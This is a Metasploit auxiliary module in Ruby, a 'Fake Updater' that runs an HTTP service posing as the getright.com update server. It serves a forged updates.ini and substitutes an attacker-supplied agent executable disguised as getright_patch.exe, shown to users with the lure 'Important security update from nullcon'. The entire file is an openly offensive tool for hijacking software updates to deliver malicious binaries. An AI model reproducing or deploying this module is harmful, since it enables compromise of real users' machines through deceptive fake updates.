require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake  Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptString.new('DESCRIPTION',    [ false, "Update description shown to user.", "Important security update from nullcon" ]),
			], self.class)
		
		@base = {	
			'vh' => ['getright.com'],
			'request' => [
			{
				'req' => '/updates.ini', 
				'type' => 'file', 
				'bin'    => 0,
				'string' => '',
				'parse' => 1,
				'file' => 'getright.ini',
			},
			{
				'req' => '/getright_patch.exe', 
				'type' => 'agent', 
				'bin'    => 1,		    
				'string' => '',
				'parse' => 0,
				'file' => ''
			}
			],
			'options' => {  
				'description'  => { 
					'val' => datastore['description'],
					'dynamic' =>0
				}
			}
		}
	end
end
